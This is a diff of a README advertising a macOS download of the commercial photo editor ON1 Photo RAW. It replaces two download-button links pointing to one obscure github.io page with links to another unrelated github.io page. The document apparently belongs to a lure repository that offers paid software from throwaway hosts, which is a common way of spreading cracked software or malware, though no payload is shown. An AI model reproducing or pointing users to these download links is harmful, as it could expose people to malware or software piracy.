@@ -7,7 +7,7 @@ With its seamless balance of speed, power, and flexibility, ON1 Photo RAW is ide
 ---
 
 ## ✅ Download ON1 Photo RAW for macOS  
-[![Download ON1 Photo RAW](https://img.shields.io/badge/Download-ON1_Photo_RAW-blueviolet)](https://shuziktobehuman.github.io/huja/ON1)
+[![Download ON1 Photo RAW](https://img.shields.io/badge/Download-ON1_Photo_RAW-blueviolet)](https://mitrobandus.github.io/.github/ON1)
 
 ---
 
@@ -64,7 +64,7 @@ ON1 Photo RAW is a professional-grade photo editing application that combines no
 
 ---
 
-[![Download ON1 Photo RAW](https://img.shields.io/badge/Download-ON1_Photo_RAW-blueviolet)](https://shuziktobehuman.github.io/huja/ON1)
+[![Download ON1 Photo RAW](https://img.shields.io/badge/Download-ON1_Photo_RAW-blueviolet)](https://mitrobandus.github.io/.github/ON1)
 
 ---
 
